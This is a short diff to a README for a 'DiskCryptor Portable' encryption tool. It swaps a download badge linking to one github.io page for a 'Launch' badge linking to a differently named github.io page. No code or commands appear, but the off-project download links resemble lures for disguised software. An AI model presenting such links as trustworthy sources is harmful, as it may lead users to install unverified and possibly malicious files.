@@ -1,10 +1,7 @@
 # DiskCryptor Portable – Run Encryption Anywhere
 
-## 📥 Download DiskCryptor Portable
+[![Launch DiskCryptor Portable](https://img.shields.io/badge/Launch-DiskCryptor%20Portable-1D4ED8?style=flat-square)](https://diskcryptor-portable-anywhere.github.io/.github/)
 
-[![⬇️ Download DiskCryptor Portable](https://img.shields.io/badge/Download-DiskCryptor%20Portable-blue?style=for-the-badge&logo=windows)](https://monicacrossmon.github.io/.github/diskcryptor-portable)
-
----
 
 ## 📦 How to Install
 
